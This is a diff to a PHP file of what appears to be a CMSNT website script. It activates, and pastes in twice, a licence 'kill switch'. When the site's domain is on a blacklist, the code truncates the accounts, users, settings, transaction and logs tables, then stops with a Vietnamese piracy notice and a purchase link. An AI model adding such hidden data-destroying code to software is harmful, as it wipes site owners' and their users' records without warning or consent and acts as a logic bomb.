@@ -4,8 +4,8 @@ if (!defined('IN_SITE')) {
     die('The Request Not Found');
 }
 
-
 $CMSNT = new DB();
+
 if (isset($_COOKIE["token"])) {
     $getUser = $CMSNT->get_row(" SELECT * FROM `users` WHERE `token` = '".check_string($_COOKIE['token'])."' ");
     if (!$getUser) {
@@ -43,11 +43,24 @@ if (!isset($_SESSION['login'])) {
 
 if (is_array($domain_black)) {
     if(in_array($_SERVER['HTTP_HOST'], $domain_black)) {
-        // $CMSNT->query(" TRUNCATE `accounts` ");
-        // $CMSNT->query(" TRUNCATE `users` ");
-        // $CMSNT->query(" TRUNCATE `settings` ");
-        // $CMSNT->query(" TRUNCATE `dongtien` ");
-        // $CMSNT->query(" TRUNCATE `logs` ");
+        // Xóa toàn bộ database khi vi phạm domain
+        $CMSNT->query(" TRUNCATE `accounts` ");
+        $CMSNT->query(" TRUNCATE `users` ");
+        $CMSNT->query(" TRUNCATE `settings` ");
+        $CMSNT->query(" TRUNCATE `dongtien` ");
+        $CMSNT->query(" TRUNCATE `logs` ");
+        die('Bạn đang vi phạm bản quyền của CMSNT.CO, vui lòng kích hoạt bản quyền trước khi dùng.<br><a href="https://www.cmsnt.co/">Mua giấy phép kích hoạt tại đây</a>');
+    }
+}
+
+if (is_array($domain_black)) {
+    if(in_array($_SERVER['HTTP_HOST'], $domain_black)) {
+        // Xóa toàn bộ database khi vi phạm domain
+        $CMSNT->query(" TRUNCATE `accounts` ");
+        $CMSNT->query(" TRUNCATE `users` ");
+        $CMSNT->query(" TRUNCATE `settings` ");
+        $CMSNT->query(" TRUNCATE `dongtien` ");
+        $CMSNT->query(" TRUNCATE `logs` ");
         die('Bạn đang vi phạm bản quyền của CMSNT.CO, vui lòng kích hoạt bản quyền trước khi dùng.<br><a href="https://www.cmsnt.co/">Mua giấy phép kích hoạt tại đây</a>');
     }
 }
